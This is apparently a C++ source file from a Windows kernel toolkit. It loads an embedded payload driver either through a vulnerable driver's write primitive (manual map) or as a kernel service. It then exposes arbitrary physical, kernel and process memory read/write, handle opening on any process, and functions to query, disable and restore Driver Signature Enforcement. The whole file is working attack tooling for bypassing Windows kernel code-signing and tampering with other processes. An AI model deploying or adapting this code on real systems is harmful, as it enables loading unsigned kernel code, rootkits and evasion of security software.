// blook-kdu: payload backend built on top of blook-drv-lite.
//
// blook-drv-lite is a manual-map-loadable kernel driver that talks to user mode
// through blook-kchannel. Instead of carrying its own payload driver, the
// toolkit embeds a build of drv-lite and loads it in one of two ways:
//
//   * manual map - through the toolkit's own mapper (needs executable kernel
//     memory and a write primitive from the vulnerable driver);
//   * service    - install the payload as a kernel service, hand it the
//     kchannel bootstrap through its Parameters key and start it. This is the
//     "service-load dev path" documented by drv-lite and works on current
//     Windows builds where mapped images cannot execute.
//
// Everything above `IKernelAccess` (SDK, CLI) is unaware of the difference.
#include "ipc/payload_client.h"

#include <windows.h>

#include <algorithm>
#include <cstring>
#include <optional>
#include <string>
#include <vector>

#include "blook/drvlite/sdk.h"

#include "core/log.h"
#include "core/page_table.h"
#include "core/trace.h"
#include "core/win32.h"

#if __has_include("payload_blob.h")
#include "payload_blob.h"
#define KDU_HAVE_PAYLOAD_BLOB 1
#else
#define KDU_HAVE_PAYLOAD_BLOB 0
#endif

// When the build is supposed to carry the drv-lite payload (xmake sets
// KDU_EXPECT_PAYLOAD on kdu_ipc), a missing blob header means the payload
// was not built before this translation unit - fail the build instead of
// producing a CLI whose `payload` commands only answer "this build has no
// payload backend".
#if defined(KDU_EXPECT_PAYLOAD) && !KDU_HAVE_PAYLOAD_BLOB
#error \
    "payload_blob.h is missing: kdu_payload must be built before kdu_ipc (drop build/ and rebuild)"
#endif

namespace blook::kdu::ipc {
namespace {

#if KDU_HAVE_PAYLOAD_BLOB
constexpr std::string_view kPayloadServiceName = "kduPayload";
constexpr std::string_view kPayloadImageName = "blook-drv-lite";
constexpr std::uint32_t kMaxTransfer = 0xFC00;  // drv-lite per-call cap

Status from_drvlite(int status) {
    switch (status) {
        case DRVLITE_OK:
            return Status::ok;
        case DRVLITE_ERR_PARAM:
            return Status::invalid_argument;
        case DRVLITE_ERR_NOMEM:
            return Status::no_memory;
        case DRVLITE_ERR_TIMEOUT:
            return Status::timeout;
        case DRVLITE_ERR_BUSY:
            return Status::busy;
        case DRVLITE_ERR_NOT_FOUND:
            return Status::not_found;
        case DRVLITE_ERR_ALREADY:
            return Status::already_exists;
        case DRVLITE_ERR_UNSUPPORTED:
            return Status::not_supported;
        case DRVLITE_ERR_ACCESS:
            return Status::access_denied;
        case DRVLITE_ERR_NOT_LOADED:
            return Status::payload_unavailable;
        default:
            return Status::io_error;
    }
}

// Adapter that maps IKernelAccess onto a drv-lite session.
class DrvLiteKernelAccess final : public IKernelAccess {
   public:
    explicit DrvLiteKernelAccess(drvlite::session& session)
        : session_(&session) {}

    [[nodiscard]] std::string_view backend_name() const override {
        return "payload";
    }

    [[nodiscard]] exploits::Capability capabilities() const override {
        using exploits::Capability;
        return Capability::physical_read | Capability::physical_write |
               Capability::virtual_read | Capability::virtual_write |
               Capability::translate;
    }

    Result<std::size_t> read_physical(std::uint64_t address, void* buffer,
                                      std::size_t size) override {
        return transfer(address, buffer, size, false, false);
    }

    Result<std::size_t> write_physical(std::uint64_t address,
                                       const void* buffer,
                                       std::size_t size) override {
        return transfer(address, const_cast<void*>(buffer), size, true, false);
    }

    Result<std::size_t> read_virtual(std::uint64_t address, void* buffer,
                                     std::size_t size) override {
        return transfer(address, buffer, size, false, true);
    }

    Result<std::size_t> write_virtual(std::uint64_t address, const void* buffer,
                                      std::size_t size) override {
        return transfer(address, const_cast<void*>(buffer), size, true, true);
    }

    Result<std::uint64_t> translate(std::uint64_t address) override {
        if (!walker_) {
            auto walker = make_walker();
            if (!walker) {
                return Result<std::uint64_t>::fail(walker.error().code,
                                                   walker.error().message);
            }
            walker_ = std::move(walker.value());
        }
        auto translation = walker_->translate(address);
        if (!translation) {
            return Result<std::uint64_t>::fail(translation.error().code,
                                               translation.error().message);
        }
        return Result<std::uint64_t>::ok(translation->physical);
    }

    Result<std::uint64_t> process_cr3(std::uint32_t pid) override {
        drvlite::process_details details{};
        const int status = session_->process_info(pid, &details);
        if (status != DRVLITE_OK) {
            return Result<std::uint64_t>::fail(from_drvlite(status),
                                               drvlite::status_string(status));
        }
        if (!details.cr3_validated || details.cr3 == 0) {
            return Result<std::uint64_t>::fail(
                Status::address_translation_failed,
                "drv-lite could not validate the target CR3");
        }
        return Result<std::uint64_t>::ok(details.cr3);
    }

    Result<std::size_t> read_process(std::uint32_t pid, std::uint64_t address,
                                     void* buffer, std::size_t size) override {
        return process_transfer(pid, address, buffer, size, false);
    }

    Result<std::size_t> write_process(std::uint32_t pid, std::uint64_t address,
                                      const void* buffer,
                                      std::size_t size) override {
        return process_transfer(pid, address, const_cast<void*>(buffer), size,
                                true);
    }

    Result<std::vector<ModuleInfo>> enumerate_modules() override {
        std::vector<drvlite_module_info> modules;
        const int status = session_->modules(0, &modules);
        if (status != DRVLITE_OK) {
            return Result<std::vector<ModuleInfo>>::fail(
                from_drvlite(status), drvlite::status_string(status));
        }
        std::vector<ModuleInfo> result;
        result.reserve(modules.size());
        for (const auto& module : modules) {
            ModuleInfo info;
            const std::size_t length =
                strnlen(module.name, sizeof(module.name));
            std::string full(module.name, length);
            // drv-lite reports loader paths; the SDK exposes base names.
            const auto separator = full.find_last_of("\\\\/");
            info.name = separator == std::string::npos
                            ? full
                            : full.substr(separator + 1);
            info.path = std::move(full);
            info.base = module.base;
            info.size = module.size;
            result.push_back(std::move(info));
        }
        return Result<std::vector<ModuleInfo>>::ok(std::move(result));
    }

    Result<DseState> dse_state() {
        drvlite::dse_status status{};
        const int result = session_->dse_query(&status);
        if (result != DRVLITE_OK || !status.supported) {
            return Result<DseState>::fail(
                Status::dse_not_found, result == DRVLITE_OK
                                           ? "drv-lite: DSE patch unsupported"
                                           : drvlite::status_string(result));
        }
        DseState state;
        state.enabled = status.current != 0;
        state.options = status.current;
        state.options_address = status.address;
        return Result<DseState>::ok(state);
    }

    Result<void> dse_disable() {
        const int result = session_->dse_set(0);
        if (result != DRVLITE_OK) {
            return Result<void>::fail(from_drvlite(result),
                                      drvlite::status_string(result));
        }
        return Result<void>::ok();
    }

    Result<void> dse_restore() {
        const int result = session_->dse_restore();
        if (result != DRVLITE_OK) {
            return Result<void>::fail(from_drvlite(result),
                                      drvlite::status_string(result));
        }
        return Result<void>::ok();
    }

   private:
    Result<std::size_t> transfer(std::uint64_t address, void* buffer,
                                 std::size_t size, bool write,
                                 bool virtual_address) {
        auto* bytes = static_cast<std::uint8_t*>(buffer);
        std::size_t done = 0;
        while (done < size) {
            const auto chunk = static_cast<std::uint32_t>(
                std::min<std::size_t>(kMaxTransfer, size - done));
            int status = 0;
            if (virtual_address) {
                status = write ? session_->write_kernel(address + done,
                                                        bytes + done, chunk)
                               : session_->read_kernel(address + done,
                                                       bytes + done, chunk);
            } else {
                status = write ? session_->write_physical(address + done,
                                                          bytes + done, chunk)
                               : session_->read_physical(address + done,
                                                         bytes + done, chunk);
            }
            if (status != DRVLITE_OK) {
                return Result<std::size_t>::fail(
                    from_drvlite(status), drvlite::status_string(status));
            }
            done += chunk;
        }
        return Result<std::size_t>::ok(done);
    }

    Result<std::size_t> process_transfer(std::uint32_t pid,
                                         std::uint64_t address, void* buffer,
                                         std::size_t size, bool write) {
        auto* bytes = static_cast<std::uint8_t*>(buffer);
        std::size_t done = 0;
        while (done < size) {
            const auto chunk = static_cast<std::uint32_t>(
                std::min<std::size_t>(kMaxTransfer, size - done));
            const int status =
                write ? session_->write_process(pid, address + done,
                                                bytes + done, chunk)
                      : session_->read_process(pid, address + done,
                                               bytes + done, chunk);
            if (status != DRVLITE_OK) {
                return Result<std::size_t>::fail(
                    from_drvlite(status), drvlite::status_string(status));
            }
            done += chunk;
        }
        return Result<std::size_t>::ok(done);
    }

    Result<core::PageTableWalker> make_walker() {
        drvlite::process_details system{};
        const int result = session_->process_info(4, &system);
        if (result != DRVLITE_OK || system.cr3 == 0) {
            return Result<core::PageTableWalker>::fail(
                Status::address_translation_failed,
                "cannot resolve the kernel CR3 through drv-lite");
        }
        auto read = [this](std::uint64_t address, void* buffer,
                           std::size_t size) -> Result<std::size_t> {
            return read_physical(address, buffer, size);
        };
        return Result<core::PageTableWalker>::ok(core::PageTableWalker(
            system.cr3 & core::kPhysicalAddressMask, std::move(read)));
    }

    drvlite::session* session_ = nullptr;
    std::optional<core::PageTableWalker> walker_;
};

// One payload load: owns the drv-lite session and, for the service path, the
// staged driver file + service entry.
class DrvLitePayloadBackend final : public IPayloadBackend {
   public:
    Result<std::unique_ptr<IKernelAccess>> map(IManualMapper* mapper,
                                               const MapOptions& options,
                                               MappedImage* mapping) override {
        session_ = std::make_unique<drvlite::session>();
        drvlite::attach_options attach;
        attach.region_size = 0x40000;
        int status = session_->attach(attach);
        if (status != DRVLITE_OK) {
            return Result<std::unique_ptr<IKernelAccess>>::fail(
                Status::payload_unavailable,
                std::string("kchannel attach failed: ") +
                    drvlite::status_string(status));
        }

        const auto image = std::span<const std::uint8_t>(
            kdu_payload_image, kdu_payload_image_size);
        const auto mode = options.payload_load_mode;
        std::string manual_error;
        std::string service_error;

        if (mode != PayloadLoadMode::service && mapper != nullptr) {
            MapOptions map_options = options;
            map_options.name = std::string(kPayloadImageName);
            const auto* bootstrap =
                reinterpret_cast<const std::uint8_t*>(&session_->bootstrap());
            map_options.bootstrap.assign(bootstrap,
                                         bootstrap + sizeof(kc_bootstrap));
            auto mapped = mapper->map(image, map_options);
            if (mapped) {
                manual_ = true;
                if (finish_mapping(mapped.value(), mapping)) {
                    access_ = std::make_unique<DrvLiteKernelAccess>(*session_);
                    return Result<std::unique_ptr<IKernelAccess>>::ok(
                        std::make_unique<DrvLiteKernelAccess>(*session_));
                }
                manual_error = finish_error_;
            } else {
                manual_error = mapped.error().message;
            }
            if (mode == PayloadLoadMode::manual_map) {
                session_->detach();
                return Result<std::unique_ptr<IKernelAccess>>::fail(
                    Status::mapping_failed,
                    "manual-map payload failed: " + manual_error);
            }
        }

        if (mode != PayloadLoadMode::manual_map) {
            if (load_service()) {
                if (finish_mapping(MappedImage{}, mapping)) {
                    access_ = std::make_unique<DrvLiteKernelAccess>(*session_);
                    return Result<std::unique_ptr<IKernelAccess>>::ok(
                        std::make_unique<DrvLiteKernelAccess>(*session_));
                }
                service_error = finish_error_;
                unload_service();
            } else {
                service_error = load_service_error_;
            }
        }
        session_->detach();
        return Result<std::unique_ptr<IKernelAccess>>::fail(
            Status::payload_unavailable,
            "payload could not be loaded (manual: " + manual_error +
                "; service: " + service_error + ")");
    }

    Result<DseState> dse_state() override { return access_->dse_state(); }
    Result<void> dse_disable() override { return access_->dse_disable(); }
    Result<void> dse_restore() override { return access_->dse_restore(); }
    Result<std::uintptr_t> open_process_handle(std::uint32_t pid,
                                               std::uint32_t access) override {
        HANDLE handle = nullptr;
        std::uint32_t granted = 0;
        const int status =
            session_->open_process_handle(pid, access, &handle, &granted);
        if (status != DRVLITE_OK) {
            return Result<std::uintptr_t>::fail(from_drvlite(status),
                                                drvlite::status_string(status));
        }
        return Result<std::uintptr_t>::ok(
            reinterpret_cast<std::uintptr_t>(handle));
    }
    Result<void> close_handle(std::uintptr_t handle,
                              std::uint32_t pid) override {
        const int status =
            session_->close_handle(reinterpret_cast<HANDLE>(handle), pid);
        if (status != DRVLITE_OK) {
            return Result<void>::fail(from_drvlite(status),
                                      drvlite::status_string(status));
        }
        return Result<void>::ok();
    }

    Result<void> unload() override {
        if (!session_) {
            return Result<void>::ok();
        }
        (void)session_->shutdown();
        if (service_loaded_) {
            unload_service();
        }
        session_->detach();
        session_.reset();
        return Result<void>::ok();
    }

    [[nodiscard]] bool attached() const override {
        return session_ && session_->active();
    }

   private:
    bool finish_mapping(const MappedImage& mapped, MappedImage* out) {
        const int status = session_->finish(5000);
        if (status != DRVLITE_OK) {
            finish_error_ = std::string("handshake failed: ") +
                            drvlite::status_string(status);
            return false;
        }
        drvlite::device_info info{};
        if (session_->query_info(&info) != DRVLITE_OK) {
            finish_error_ = "drv-lite query_info failed after handshake";
            return false;
        }
        if (out) {
            out->name = std::string(kPayloadImageName);
            out->base = info.driver_base != 0 ? info.driver_base : mapped.base;
            out->size = info.driver_size != 0 ? info.driver_size : mapped.size;
            out->entry_status = 0;
        }
        return true;
    }

    bool load_service() {
        service_path_ = core::make_staging_path("kdu_payload_", ".sys");
        auto written = core::write_file(service_path_, kdu_payload_image,
                                        kdu_payload_image_size);
        if (!written) {
            load_service_error_ =
                "cannot stage the payload: " + written.error().message;
            return false;
        }
        auto manager = core::ServiceControl::open();
        if (!manager) {
            load_service_error_ = manager.error().message;
            return false;
        }
        const auto name = core::to_utf16(std::string(kPayloadServiceName));
        // Clear a stale payload service from a previous crashed/killed run
        // (it would keep the old kchannel bootstrap and break the handshake).
        (void)manager->stop(name);
        (void)manager->remove(name);
        auto created =
            manager->create_driver(name, core::to_utf16(service_path_));
        if (!created) {
            load_service_error_ = created.error().message;
            (void)core::remove_file(service_path_);
            return false;
        }
        service_loaded_ = true;
        const kc_bootstrap& bootstrap = session_->bootstrap();
        auto parameters = manager->set_parameters_binary(
            name, L"Bootstrap", &bootstrap, sizeof(bootstrap));
        if (!parameters) {
            load_service_error_ =
                "cannot publish the bootstrap: " + parameters.error().message;
            unload_service();
            return false;
        }
        core::remember_staged_driver(std::string(kPayloadServiceName),
                                     service_path_);
        auto started = manager->start(name);
        if (!started) {
            load_service_error_ = started.error().message;
            unload_service();
            return false;
        }
        return true;
    }

    void unload_service() {
        auto manager = core::ServiceControl::open();
        if (manager) {
            const auto name = core::to_utf16(std::string(kPayloadServiceName));
            (void)manager->stop(name);
            (void)manager->remove(name);
        }
        if (!service_path_.empty()) {
            (void)core::remove_file(service_path_);
        }
        core::forget_staged_driver(std::string(kPayloadServiceName));
        service_loaded_ = false;
    }

    std::unique_ptr<drvlite::session> session_;
    std::unique_ptr<DrvLiteKernelAccess> access_;
    bool manual_ = false;
    bool service_loaded_ = false;
    std::string service_path_;
    std::string finish_error_;
    std::string load_service_error_;
};
#endif  // KDU_HAVE_PAYLOAD_BLOB

}  // namespace

std::unique_ptr<IPayloadBackend> create_payload_backend() {
#if KDU_HAVE_PAYLOAD_BLOB
    return std::make_unique<DrvLitePayloadBackend>();
#else
    return nullptr;
#endif
}

}  // namespace blook::kdu::ipc
